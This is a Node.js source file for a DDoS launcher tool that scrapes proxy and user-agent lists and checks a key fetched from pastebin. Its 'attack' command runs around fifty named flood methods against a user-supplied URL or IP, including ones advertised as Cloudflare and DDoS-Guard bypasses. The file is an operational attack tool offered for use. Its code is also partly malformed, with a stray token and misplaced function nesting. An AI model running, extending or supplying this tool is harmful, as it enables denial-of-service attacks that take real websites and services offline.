#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '3.6.8'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //

function checkExpiration() {
  const expirationDate = new Date('2025-02-01'); // Set your expiration date here (YYYY-MM-DD format)
  const currentDate = new Date();

  if (currentDate >= expirationDate) {
console.log(`
┌──────────────────────────────────────────────────────────────────────────────────┐
|                                                                                  |
|                             ⚠️  IMPORTANT NOTICE  ⚠️                               |
|                                                                                  |
|  This script has expired.                                                        |
|  Please contact support for further assistance and to ensure continued usage.    |
|                                                                                  |
|  Contact Information:                                                            |
|    - Admin : @JustFunforMe                                                       |
|    - Admin : @ZenoObfuscate                                                      |
|    - Owner : @StarsXPD                                                           |
|                                                                                  |
|  We appreciate your understanding and cooperation.                               |
|                                                                                  |
└──────────────────────────────────────────────────────────────────────────────────┘

`);
    process.exit(-1); // Exit the process
  } else {
    console.log('The script is still valid.');
    // Continue with the rest of your script=
async function banner() {
console.clear()
console.log(`

  ▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
  ▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
  ▐▓█░░▄░░▀▄░░█▓▌░█▄▄▄█░
  ▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
  ░░░░▄▄███▄▄░░░░░█████░ : Read the note!
┌────────────────────────────────────────────────────────────┐
│                      Information                           │
├────────────────────────────────────────────────────────────┤
│ Tool Name: SantoMxBhai SPECIAL TOOLS                       │
│ Version: SpXeno ${version}                                      │
│ Owner: SantoMxBhai                                         │
│ Premium: Enable                                            │
│ User: ZenoObfuscate                                        │
├────────────────────────────────────────────────────────────┤
│ > Telegram: @StarsXPD                                      │
│ > Channel: https://t.me/apidomod                           │
│ > Powerful Tools and ©2025 All Rights Reserved!            │
└────────────────────────────────────────────────────────────┘
==============================================================
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://pastebin.com/raw/sBH3iYXp');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
      console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
      
      const secretBangetJir = await fetch('https://pastebin.com/raw/6EnLmwpE');
      const password = await secretBangetJir.text();
      console.log(`Login Key Required`);
      permen.question('[\x1b[1m\x1b[31mroot@ZenoObfuscate \x1b[0m]: \n', async (skibidi) => {
        if (!skibidi.trim()) { // ဘာမှမထည့်ဘဲ Enter နှိပ်ရင်
    console.log('Enter your vip key'); // Enter your vip key message ကို ထုတ်ပါ
    return bootup(); // function ကို ထပ်မစေဘဲ return လုပ်ပါ
  }
        if (skibidi === password.trim()) {
          console.log(`Successful, Please Waiting...`);
          await scrapeProxy();
          console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`);
          await scrapeUserAgent();
          console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`);
          await sleep(700);
          console.clear();
          console.log(`Tool is Automatically Starting : Current - ${version}`);
          await sleep(1000);
          await banner();
          console.log(`Type "help" to show all available commands`);
          sigma();
        } else {
          console.log(`Wrong Key`);
          process.exit(-1);
        }
      });
    } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`);
      console.log(`Waiting Auto Update...`);
      await exec(`npm uninstall -g prmnmd-tuls`);
      console.log(`Installing update`);
      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Restart Tools Please`);
      process.exit();
    }
  } catch (error) {
    console.log(`Can't connect your connection!`);
    // Wait for 5 seconds and then exit
    setTimeout(() => {
      process.exit();
    }, 5000); // 5000 milliseconds = 5 seconds
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\n𝙼𝚘𝚗𝚒𝚝𝚘𝚛 𝙰𝚝𝚝𝚊𝚌𝚔:\n");
  processList.forEach((process) => {
console.log(`𝚃𝚊𝚛𝚐𝚎𝚝: ${process.target}
𝙼𝚎𝚝𝚑𝚘𝚍𝚜: ${process.methods}
𝙳𝚞𝚛𝚊𝚝𝚒𝚘𝚗𝚜: ${process.duration} 𝚂𝚎𝚌𝚘𝚗𝚍𝚜
𝚂𝚒𝚗𝚌𝚎𝚜: ${Math.floor((Date.now() - process.startTime) / 1000)} 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 𝚊𝚐𝚘\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
  
console.log(`
+-------------------------------------------------------------+
|                         USAGE EXAMPLE                       |
|-------------------------------------------------------------|
|  Command Format:                                            |
|    attack <url/ip> <duration> <methods>                     |
|                                                             |
|  Example:                                                   |
|    attack https://zeno.com 500 flood                        |
|                                                             |
|  Description:                                               |
|    - <url/ip>: The target URL or IP address.                |
|    - <duration>: The duration of the attack in seconds.     |
|    - <methods>: The method to use for the attack.           |
+-------------------------------------------------------------+
`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`

▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
░░░░▄▄███▄▄░░░░░█████░ [ Let's Down ]
┌────────────────────────────────────────────────────────────┐
│ Target     : ${target}                                      │
│ Duration   : ${duration}                                    │
│ Methods    : ${methods}                                     │
│ AS         : ${result.as}                                   │
│ IP         : ${result.query}                                │
│ ISP        : ${result.isp}                                  │
│ Status     : Attack Successfully                            │
│ Sender     : SantoMxBhai                                    │
└────────────────────────────────────────────────────────────┘
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'night-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt flood`)
	sigma()
  } else if (methods === 'stev-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'stev-traffic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} GET 20`)
	sigma()
  } else if (methods === 'uam') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'medusa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 999999 proxy.txt`)
	sigma()
  } else if (methods === 'night-bypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt bypass`)
	sigma()
  } else if (methods === 'tlsv1') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'steven') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 999999`)
	sigma()
  } else if (methods === 'tornado') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'xlamper-bom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 40`)
	sigma()
  } else if (methods === 'mixmax') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20`)
	sigma()
  } else if (methods === 'xlamper') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 20 proxy.txt`)
	sigma()
  } else if (methods === 'inferno') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'killer') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'tls-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'lezkill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tpc') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'geckold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'mix') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (methods === 'mixsyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
	} else if (methods === 'pidoras') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'glory') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'skynet-tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tls-vip') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60 10 proxy.txt 100`)
	sigma()
  } else if (methods === '404') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'aqua') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'astral') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'barave') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bomba') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bot') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'brow-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'browserddos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-saturn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-test') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'bypass-x') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'cfa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'cfbypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60`)
	sigma()
	} else if (methods === 'dev') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'dos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'downrapid') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'dragonc2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'esic') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'flood-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushMonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 999999`)
    sigma()
    } else if (methods === 'strike') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 50 999999 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 9283899 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`\nMethods ${methods} not recognized. [ Not Found this method ]`);
    setTimeout(() => {
        process.exit(-1);
    }, 3000); // 3000 milliseconds = 3 seconds
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
┌────────────────────────────────────────────────────────────┐
│                𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗯𝘆 𝗭𝗲𝗻𝗼𝗢𝗯𝗳𝘂𝘀𝗰𝗮𝘁𝗲                    │
├────────────────────────────────────────────────────────────┤
│ 𝐓𝐡𝐚𝐧𝐤 𝐓𝐨 :                                                 │
│                                                            │
│ • SantoMxBhai                                              │
│ • Unknown                                                  │
│ • 한린xBomAi                                               │
│ • FlinX                                                    │
│ • All Subscribers                                          │
│ • My Team                                                  │
│ • All Creators                                            │
│                                                            │
│ ©2024-2025 | All Rights Reserved.                          │
└────────────────────────────────────────────────────────────┘
`
permen.question('[\x1b[1m\x1b[32mroot@ZenoObfuscate\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
┌───────────┬──────────────────────────────────────┐
│ Command   │ Description                          │
├───────────┼──────────────────────────────────────┤
│ methods   │ Show list of available methods       │
│ attack    │ Launch DDoS attack                   │
│ monitor   │ Show monitor attack                  │
│ credits   │ Show creator of these tools          │
│ clear     │ Clear terminal                       │
└───────────┴──────────────────────────────────────┘
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
┌──────────────────────────────────────────────────────────────┐
│ Name           │ Category [LAYER7]                           │
├────────────────┼─────────────────────────────────────────────┤
│ 404            │ 404 Error Connection                        │
│ aqua           │ Unknown Method                              │
│ astral         │ Unknown Method                              │
│ barave         │ Unknown Method                              │
│ bomba          │ High Performance                            │
│ bot            │ High Performance                            │
│ brow-x         │ High Performance                            │
│ browserddos    │ Bypass DDoS Protection 1                    │
│ bypass         │ High Power Bypass                           │
│ bypass-saturn  │ Bypass DDoS Protection 2                    │
│ bypass-test    │ Bypass DDoS Protection 3                    │
│ bypass-x       │ Bypass DDoS Protection 4                    │
│ cfa            │ Cloudflare Bypass V1                        │
│ cfbypass       │ Cloudflare Bypass V2                        │
│ destroy        │ Killing the Socket                          │
│ dev            │ Unknown                                     │
│ dos            │ DoS Attacking                               │
│ downrapid      │ Version 1.0                                 │
│ dragonc2       │ Dragon Method                               │
│ esic           │                                             │
│ flood          │ HTTP(s) Flood DoS                           │
│ flood-bypass   │ HTTP(s) Bypass Flood                        │
│ geckold        │ VIP Method                                  │
│ glory          │ Best Method                                 │
│ inferno        │ Power of Raining                            │
│ kill           │ Bypass CF                                   │
│ killer         │ Freeze Server                               │
│ lezkill        │ Server Error                                │
│ medusa         │ Server Freezer                              │
│ mix            │ Mix Power V1                                │
│ mixmax         │ Mix High Power                              │
│ mixsyn         │ Mix Power V2                                │
│ night-bypass   │ High RPS Bypass [Owner Only]                │
│ night-flood    │ High DoS Attack [Owner Only]                │
│ pidoras        │ Highest Power                               │
│ rape           │ Bypass DDoS Protection                      │
│ raw            │ Huge RPS Flexing                            │
│ slim           │ VIP Method                                  │
│ skynet-tls     │ SkyNet Request Power of TLS                 │
│ steven         │ Unknown (New Methods)                       │
│ stev-flood     │ Unknown (New Methods)                       │
│ stev-traffic   │ Unknown (New Methods)                       │
│ storm          │ Request Raining Method                      │
│ strike         │ Best Attacking Method                       │
│ thunder        │ Power of Massive Method                     │
│ tls            │ TLS V1.3                                    │
│ tls-bypass     │ TLS-Bypass V1                               │
│ tls-vip        │ TLS-VIP                                     │
│ tlsv1          │ TLS-VIP2                                    │
│ tornado        │ RPS AI                                      │
│ tpc            │ VIP Methods                                 │
│ uam            │ Bypass DDoS-Guard                           │
│ xlamper        │ Connection Timeout                          │
│ xlamper-bom    │ Bomber Request                              │
└────────────────┴─────────────────────────────────────────────┘
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorAttack()
<-    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
  }
}

// Example usage
checkExpiration();

// Proceed with the rest of your script if not expired